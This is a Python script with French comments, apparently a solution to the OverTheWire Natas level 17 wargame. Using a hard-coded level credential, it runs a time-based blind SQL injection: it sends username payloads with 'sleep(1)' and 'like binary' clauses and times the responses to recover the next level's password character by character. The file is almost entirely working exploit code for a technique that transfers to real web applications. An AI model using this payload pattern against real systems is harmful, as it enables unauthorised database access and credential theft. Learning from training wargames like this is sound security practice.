#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests # gestion des requêtes
import string   # gestion des chaîne de caractères
import tqdm     # affichage de la barre de progression

# Variable pour se connecter au site
url = "http://natas17.natas.labs.overthewire.org/"
user = "natas17"
passw = "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"

# Connexion au site
response = requests.get(url, auth=(user, passw))
session1 = requests.Session()

# Génération des caractères à tester
characters = ''.join([string.ascii_letters,string.digits])

# On test tout les caractères du mot de passe pour savoir lequels appartiennent aux mot de passe
chracters_used_in_passwd = []
for c in tqdm.tqdm(characters):
    # Requête injection sql
    # Il va tester toutes les lettres si une lettre est bonne elle on active une pause.
    response = session1.post(url,
                             data = {'username' : f'natas18" and password like binary "%{c}%" and sleep(1) #'},
                             auth = (user, passw) )
    # Si entre le demande de requête et la reponse il y un interval de temps >= 1 alors on a trouvé une lettre qui appartient au mot de passe.
    if(response.elapsed.seconds >= 1):  
        chracters_used_in_passwd.append(c)
print("Caractèrs utilisés dans le mot de passe: ", chracters_used_in_passwd)

# On restore le mot de passe
restored_passw = ""
# On brute force le mot de passe
for _ in tqdm.tqdm(range(32)):
    for c in chracters_used_in_passwd:
        tmp_passw = restored_passw + c
        # On reconstruie le mot de passe en testant toutes les lettres à partire du début.
        response = session1.post(url,
                                 data = {'username' : f'natas18" and password like binary "{tmp_passw}%" and sleep(1) #'},
                                 auth = (user, passw) )
        # Si 1 ou plus alors le début de mot de passe ou tout le mots passe a été trouver.
        if(response.elapsed.seconds >= 1):  
            restored_passw = tmp_passw
            break
print("Le mot de passe complet est: ", restored_passw)